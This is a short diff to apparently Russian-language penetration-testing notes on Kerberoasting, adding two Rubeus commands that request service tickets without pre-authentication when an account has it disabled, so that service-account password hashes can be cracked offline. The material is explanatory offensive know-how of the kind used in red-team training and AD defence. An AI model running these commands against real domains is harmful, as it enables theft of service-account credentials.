@@ -22,6 +22,15 @@
 
 В случае если отключена pre-auth, то есть возможна атака [[AS-REP Roasting]], тогда мы можем без аутентификации запрашивать TGS тикеты у сервиса, если в SPN вместо krbtgt укажем SPN учетной записи на сервисе
 
+Используем Rubeus
+```powershell
+./Rubeus.exe createnetonly /program:cmd.exe /show
+```
+
+```powershell
+./Rubeus.exe kerberoast /nopreauth:<username> /domain:<domain> /spn:<SPN> /nowrap
+```
+
 ## Использование Rubeus
 [[Rubeus]] незаменим для проведения атаки Kerberoasting
 
